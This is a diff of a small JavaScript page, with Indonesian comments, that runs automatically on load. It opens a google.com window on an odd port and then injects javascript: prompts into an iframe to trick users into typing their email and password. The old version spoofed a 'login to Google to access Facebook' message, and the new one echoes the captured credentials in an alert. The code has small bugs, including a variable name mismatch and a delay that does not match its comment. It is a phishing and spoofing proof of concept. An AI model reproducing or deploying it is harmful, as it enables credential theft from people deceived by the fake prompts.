@@ -9,10 +9,12 @@
         let win = window.open("https://www.google.com:1234", "_blank");
 
         // 2. Tunggu 2 detik sebelum menampilkan prompt palsu
-        setTimeout(() => {
+        setTimeout(function () {
           document.getElementById("iframe").src =
-            'javascript:prompt("In order to access Facebook.com\\nyou must first login on your\\nGoogle Account.\\n\\nPlease type your e-mail\\nand your password:\\n", "E-mail / Password");';
-        }, 3000);
+            "javascript:let Email = prompt('Enter your Email');" +
+            "let password = prompt('Enter your password');" +
+            "alert('Your creds:\\nEmail: ' + email + '\\nPassword: ' + password);";
+        }, 3000); // 2000 ms = 2 detik
       }
 
       spoof(); // Auto-run saat halaman dibuka
